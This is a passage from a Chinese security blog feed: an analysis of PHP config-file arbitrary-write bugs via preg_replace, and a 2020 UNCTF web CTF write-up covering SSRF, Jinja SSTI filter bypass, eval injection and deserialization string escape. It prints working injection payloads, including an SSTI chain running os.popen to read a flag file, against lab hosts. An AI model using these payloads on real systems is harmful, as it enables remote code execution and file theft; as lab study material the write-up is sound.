<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108205326324.png" alt="image-20201108205326324"></p>
<h1 id="0x02-贪婪模式有s"><a href="#0x02-贪婪模式有s" class="headerlink" title="0x02 贪婪模式有s"></a>0x02 贪婪模式有s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$API = <span class="string">'test'</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;;phpinfo();</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108210058585.png" alt="image-20201108210058585" style="zoom:200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;$0</span><br></pre></td></tr></table></figure>

<p><code>$0</code>为正则表达式匹配到的内容，替换后刚刚好闭合前面的引号，逃逸出<code>phpinfo()</code>。</p>
</blockquote>
<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108210456641.png" alt="image-20201108210456641"></p>
<h1 id="0x03-非贪婪无s"><a href="#0x03-非贪婪无s" class="headerlink" title="0x03 非贪婪无s"></a>0x03 非贪婪无s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$API = <span class="string">'test'</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;%27;%0aphpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108211108334.png" alt="image-20201108211108334" style="zoom:200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aa</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108211150384.png" alt="image-20201108211150384"></p>
<h1 id="0x04-非贪婪有s"><a href="#0x04-非贪婪有s" class="headerlink" title="0x04 非贪婪有s"></a>0x04 非贪婪有s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$API = <span class="string">'aa'</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>同样可以利用2的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;;phpinfo();</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108211819260.png" alt="image-20201108211819260" style="zoom:200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;$0</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108211904051.png" alt="image-20201108211904051"></p>
<blockquote>
<p>另外还可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aaa%27;phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108212053654.png" alt="image-20201108212053654" style="zoom: 150%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aaa</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108212136434.png" alt="image-20201108212136434" style="zoom:150%;">

<h1 id="0x05-define贪婪无s"><a href="#0x05-define贪婪无s" class="headerlink" title="0x05 define贪婪无s"></a>0x05 define贪婪无s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">define(<span class="string">'API'</span>, <span class="string">'aaa'</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;%27);%0aphpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108212702169.png" alt="image-20201108212702169" style="zoom:200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aa</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108212748153.png" alt="image-20201108212748153"></p>
<h1 id="0x06-define贪婪有s"><a href="#0x06-define贪婪有s" class="headerlink" title="0x06 define贪婪有s"></a>0x06 define贪婪有s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">define(<span class="string">'API'</span>, <span class="string">'aaa'</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;t.php?api&#x3D;1\%27);phpinfo();%23</span><br></pre></td></tr></table></figure>

<p>因为<code>preg_replace</code>在替换的时候会吃掉转义符，利用这个特点，即可引入单引号。这种方法可以通杀全文的</p>
</blockquote>
<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108220939815.png" alt="image-20201108220939815"></p>
<h1 id="0x07-define非贪婪无s"><a href="#0x07-define非贪婪无s" class="headerlink" title="0x07 define非贪婪无s"></a>0x07 define非贪婪无s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">define(<span class="string">'API'</span>, <span class="string">'aaa'</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;t.php?api&#x3D;1\%27);phpinfo();%23</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p><a href="http://192.168.59.156/test.php?api=%27);phpinfo();//" target="_blank" rel="noopener">http://192.168.59.156/test.php?api=%27);phpinfo();//</a></p>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108225823689.png" alt="image-20201108225823689" style="zoom:200%;">

<blockquote>
<p><a href="http://192.168.59.156/test.php?api=aa" target="_blank" rel="noopener">http://192.168.59.156/test.php?api=aa</a></p>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108225742409.png" alt="image-20201108225742409" style="zoom:150%;">

<h1 id="0x08-define非贪婪有s"><a href="#0x08-define非贪婪有s" class="headerlink" title="0x08 define非贪婪有s"></a>0x08 define非贪婪有s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">define(<span class="string">'API'</span>, <span class="string">'aaa'</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;%27);phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108230146553.png" alt="image-20201108230146553" style="zoom:200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aa</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108230223421.png" alt="image-20201108230223421" style="zoom:200%;">

<p>参考链接：</p>
<p><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">经典写配置漏洞与几种变形</a></p>
]]></content>
      <tags>
        <tag>vul</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-UNCTF-Web-wp</title>
    <url>/2020/11/08/2020-UNCTF-Web-wp/</url>
    <content><![CDATA[<p>记录复现2020UNCTF部分题目</p>
<a id="more"></a>

<h1 id="0x01-easy-ssrf"><a href="#0x01-easy-ssrf" class="headerlink" title="0x01 easy_ssrf"></a>0x01 easy_ssrf</h1><p>直接</p>
<p>url=00://unctf.com/../../../../../../../flag</p>
<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108135113057.png" alt="image-20201108135113057"></p>
<h1 id="0x02-easyflask"><a href="#0x02-easyflask" class="headerlink" title="0x02 easyflask"></a>0x02 easyflask</h1><p>admin登陆后可以得到/secret_route_you_do_not_know路由</p>
<p>然后可以测试到guess参数存在SSTI。但是过滤了<code>_ &#39; &quot; ] %</code>,最后利用<code>|attr</code>和<code>request</code>绕过过滤，执行命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;secret_route_you_do_not_know?guess&#x3D;&#123;&#123;app|attr(request.args.param)|attr(request.args.a)|attr(request.args.b)()|attr(request.args.c)(117)|attr(request.args.d)|attr(request.args.e)|attr(request.args.c)(request.args.f)|attr(request.args.c)(request.args.g)(request.args.h)&#125;&#125;&amp;param&#x3D;__class__&amp;a&#x3D;__base__&amp;b&#x3D;__subclasses__&amp;c&#x3D;__getitem__&amp;d&#x3D;__init__&amp;e&#x3D;__globals__&amp;f&#x3D;__builtins__&amp;g&#x3D;eval&amp;h&#x3D;__import__(&quot;os&quot;).popen(&#39;cat%20flag.txt&#39;).read()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108135159161.png" alt="image-20201108135159161"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random <span class="keyword">as</span> rd</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ranstr</span><span class="params">(num)</span>:</span></span><br><span class="line">    H = &amp;<span class="comment">#39;abcdefghijklmnopqrstuvwxyz0123456789&amp;#39;</span></span><br><span class="line">    salt = &amp;<span class="comment">#39;&amp;#39;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        salt += rd.choice(H)</span><br><span class="line">    <span class="keyword">return</span> salt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECRET = ranstr(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Flask.secret_key = SECRET</span><br><span class="line"></span><br><span class="line">BLACKLIST = [&amp;<span class="comment">#39;%&amp;#39;, &amp;#39;_&amp;#39;, &amp;#39;eval&amp;#39;, &amp;#39;open&amp;#39;, &amp;#39;flag&amp;#39;,</span></span><br><span class="line">             &amp;<span class="comment">#39;in&amp;#39;, &amp;#39;-&amp;#39;, &amp;#39;class&amp;#39;, &amp;#39;mro&amp;#39;, &amp;#39;[&amp;#39;, &amp;#39;]&amp;#39;, &amp;#39;\&amp;#34;&amp;#39;, &amp;#39;\&amp;#39;&amp;#39;]</span></span><br><span class="line"></span><br><span class="line">user_dicts = dict()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    user_dicts[&amp;<span class="comment">#34;admin&amp;#34;] = User(&amp;#39;admin&amp;#39;, ranstr(32))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, password)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">black_list</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#39;GET&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> &amp;<span class="comment">#39;username&amp;#39; in session:</span></span><br><span class="line">        <span class="keyword">if</span> session[&amp;<span class="comment">#39;username&amp;#39;] == &amp;#39;admin&amp;#39;:</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                &amp;<span class="comment">#34;admin login success and check the secret route /secret_route_you_do_not_know&amp;#34;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(&amp;<span class="comment">#39;hello.html&amp;#39;, name=session[&amp;#39;username&amp;#39;])</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;a easy flask problem,first login as the admin&amp;#34;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/login&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == &amp;<span class="comment">#39;POST&amp;#39;:</span></span><br><span class="line">        username = request.form[&amp;<span class="comment">#39;username&amp;#39;] if &amp;#39;username&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line">        password = request.form[&amp;<span class="comment">#39;password&amp;#39;] if &amp;#39;password&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line">        <span class="keyword">if</span> username == &amp;<span class="comment">#34;&amp;#34; or password == &amp;#34;&amp;#34;:</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;pass the username or password use get method&amp;#34;)</span></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> user_dicts <span class="keyword">and</span> user_dicts[username].password == password:</span><br><span class="line">            session[&amp;<span class="comment">#39;username&amp;#39;] = username</span></span><br><span class="line">            <span class="keyword">if</span> username == &amp;<span class="comment">#39;admin&amp;#39;:</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;admin login success!&amp;#34;)</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;login success!!&amp;#34;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;login fail! check /register&amp;#34;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(&amp;<span class="comment">#39;login.html&amp;#39;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/register&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == &amp;<span class="comment">#39;POST&amp;#39;:</span></span><br><span class="line">        username = request.form[&amp;<span class="comment">#39;username&amp;#39;] if &amp;#39;username&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line">        password = request.form[&amp;<span class="comment">#39;password&amp;#39;] if &amp;#39;password&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username == &amp;<span class="comment">#34;&amp;#34; or password == &amp;#34;&amp;#34;:</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;pass the username or password use get method&amp;#34;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> user_dicts:</span><br><span class="line">            user_dicts[username] = User(username, password)</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;register success&amp;#34;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;the user already exists&amp;#34;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(&amp;<span class="comment">#39;register.html&amp;#39;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/secret_route_you_do_not_know&amp;#39;, methods=[&amp;#39;GET&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">()</span>:</span></span><br><span class="line">    guess = request.args[&amp;<span class="comment">#39;guess&amp;#39;] if &amp;#39;guess&amp;#39; in request.args else &amp;#39;&amp;#39;</span></span><br><span class="line">    secret_num = rd.randint(<span class="number">0</span>, <span class="number">100000</span>)</span><br><span class="line">    <span class="keyword">if</span> guess == &amp;<span class="comment">#39;&amp;#39;:</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;you should &amp;#39;guess&amp;#39; the secret number&amp;#34;)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        guess_num = int(guess)</span><br><span class="line">        <span class="keyword">if</span> guess_num == secret_num:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#39;final step, check the source code&amp;#39;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#39;you are wrong&amp;#39;)</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> black_list(guess):</span><br><span class="line">            <span class="keyword">return</span> render_template_string(guess + &amp;<span class="comment">#39; error!!&amp;#39;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#39;black list filter&amp;#39;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == &amp;<span class="comment">#39;__main__&amp;#39;:</span></span><br><span class="line">    init()</span><br><span class="line">    app.run(host=&amp;<span class="comment">#39;0.0.0.0&amp;#39;, port=80)</span></span><br></pre></td></tr></table></figure>

<h1 id="0x03-easyphp"><a href="#0x03-easyphp" class="headerlink" title="0x03 easyphp"></a>0x03 easyphp</h1><h1 id="0x04-babyeval"><a href="#0x04-babyeval" class="headerlink" title="0x04 babyeval"></a>0x04 babyeval</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;echo%20&#96;cat%20flag.php|base64&#96;;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108153855307.png" alt="image-20201108153855307"></p>
<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108153949816.png" alt="image-20201108153949816"></p>
<h1 id="0x05-easyunserialize"><a href="#0x05-easyunserialize" class="headerlink" title="0x05 easyunserialize"></a>0x05 easyunserialize</h1><p>简单的字符串逃逸导致的反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> a(<span class="string">'challengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";'</span>,<span class="number">1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> filter(serialize(<span class="keyword">new</span> a(<span class="string">'challengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";'</span>,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108155650924.png" alt="image-20201108155650924"></p>
]]></content>
  </entry>
  <entry>
    <title>shiro-1.2.4反序列化复现</title>
